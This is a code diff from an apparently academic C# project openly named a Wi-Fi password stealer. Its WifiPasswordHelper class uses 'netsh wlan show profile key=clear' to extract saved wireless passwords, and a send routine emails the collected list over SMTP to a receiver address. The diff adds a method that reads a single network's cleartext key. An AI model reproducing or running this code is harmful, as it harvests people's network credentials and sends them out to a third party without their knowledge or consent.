@@ -1,13 +1,14 @@
+using ISProject3WifiPasswordStealer.Models;
 using System.Diagnostics;
 using System.Net;
 using System.Net.Mail;
 using System.Text;
 
-namespace WifiPassword
+namespace ISProject3WifiPasswordStealer.Services
 {
     public class WifiPasswordHelper
     {
-        public List<WifiInfo> GetWifiInfo()
+        public List<WifiInfo> GetAllWifiInfo()
         {
             string[] profiles = GetProfiles();
             string[] passwords = GetWifiPasswords(profiles);
@@ -33,12 +34,13 @@ namespace WifiPassword
                 Port = 587,
 
                 DeliveryMethod = SmtpDeliveryMethod.Network,
-                                UseDefaultCredentials = false,
+                UseDefaultCredentials = false,
                 EnableSsl = true,
                 Credentials = new NetworkCredential("sender-email", "sender-app-pass")
             };
 
-            var message = new MailMessage("sender-email", "receiver-email") {
+            var message = new MailMessage("sender-email", "receiver-email")
+            {
                 Subject = "Wifi Password List",
                 Body = ""
             };
@@ -51,6 +53,8 @@ namespace WifiPassword
                 sb.AppendLine();
             }
             message.Body = sb.ToString();
+
+
 
             smtpClient.Send(message);
         }
@@ -71,6 +75,16 @@ namespace WifiPassword
             }
 
             return passwords;
+        }
+        public string GetWifiPasswordByName(string wifiName)
+        {
+
+            var output = RunCommand("netsh", $"wlan show profile \"{wifiName}\" key=clear");
+            var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+            var passwordLine = lines.FirstOrDefault(line => line.Contains("Key Content            : "));
+            var password = passwordLine.Trim().Replace("Key Content            : ", "");
+            
+            return password;
         }
 
         private static string[] GetProfiles()
